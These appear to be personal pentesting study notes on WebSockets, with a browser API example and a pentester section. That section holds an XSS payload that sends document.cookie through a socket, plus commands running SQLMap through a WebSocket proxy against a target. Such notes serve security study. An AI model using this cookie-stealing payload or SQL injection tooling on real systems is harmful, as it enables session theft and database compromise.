# WebSockets

[![modern_web_exploitation_techniques](../../../../cybersecurity/_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

<div class="row row-cols-lg-2"><div>

WebSockets are natively integrated within most web browsers. They allow real-time communication between a server and a client.

The [socket.io](/programming-languages/web/javascript/libraries/socket.io/index.md) library is a well-known library built on web sockets, while adding a lot of convenient features for real world apps.
</div><div>

For simple applications, we can directly use the WebSocket [API](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API):

```js!
const socket = new WebSocket('ws://IP:port/test'); // or "wss://" for secure communication
socket.onmessage = message => console.log("Received: " + message.data);
socket.send('test');
```

You can explore the websocket traffic from the network tab/Burp. See also tools such as [wscat](https://github.com/websockets/wscat) <small>(2.1k ⭐)</small> and [websocat](https://github.com/vi/websocat) <small>(6.6k ⭐)</small>.
</div></div>

<hr class="sep-both">

## WebSocket Pentester Notes ☠️

[![modern_web_exploitation_techniques](../../../../cybersecurity/_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

<div class="row row-cols-lg-2"><div>

Depending on how services are integrated with websockets, [XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md)/[CSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/csrf.md) and [SQLi](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md) attacks might be possible.

```html!
<img src="" onerror="socket.send(document.cookie)">
```
</div><div>

Using SQLMap with websockets may not work. We can try [sqlmap-websocket-proxy](https://github.com/BKreisel/sqlmap-websocket-proxy) <small>(0.1k ⭐)</small>, but it's more efficient to write your own <small>(reuse socket, unify results for SQLMap, handle special attacks, etc.)</small>.

```shell!
$ pipx install git+https://github.com/BKreisel/sqlmap-websocket-proxy
$ DEST="$HOME/tools/sqlmap-websocket-proxy"
$ git clone -b "main" https://github.com/BKreisel/sqlmap-websocket-proxy.git $DEST
$ # do any changes to the code
$ pipx install $DEST # or reinstall if already installed
$ sqlmap-websocket-proxy -u 'ws://IP:port/testdb' -d '{"parameter":"%param%"}' -p 1337
$ sqlmap -u 'http://localhost:1337/?param1=1*' [...]
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [The WebSocket Handbook](https://pages.ably.com/hubfs/the-websocket-handbook.pdf)
* `Sec-WebSocket-Version`
* `Sec-WebSocket-Key: base64encodedkey`
* [STEWS](https://github.com/PalindromeLabs/STEWS) (enumeration tool)
</div><div>
</div></div>